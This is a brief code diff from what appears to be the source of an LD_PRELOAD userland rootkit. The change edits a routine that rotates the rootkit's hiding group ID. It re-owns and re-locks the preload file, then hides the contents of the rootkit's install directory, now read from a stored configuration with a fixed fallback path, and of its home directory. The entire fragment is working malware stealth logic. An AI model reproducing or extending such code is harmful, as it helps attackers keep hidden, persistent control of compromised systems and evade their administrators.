@@ -70,7 +70,12 @@ gid_t changerkgid(int curtime){
     doiapath(preloadpath, 0);
     chown_path(preloadpath, newgid);
     doiapath(preloadpath, 1);
-    hidedircontents(INSTALL_DIR, newgid);
+    so = getbdvsoinf();
+    if(so != NULL){
+        hidedircontents(so->installdir, newgid);
+        free(so);
+        so = NULL;
+    }else hidedircontents(INSTALL_DIR, newgid);
     hidedircontents(HOMEDIR, newgid);
 
     for(int i = 0; i < BDVPATHS_SIZE; i++)
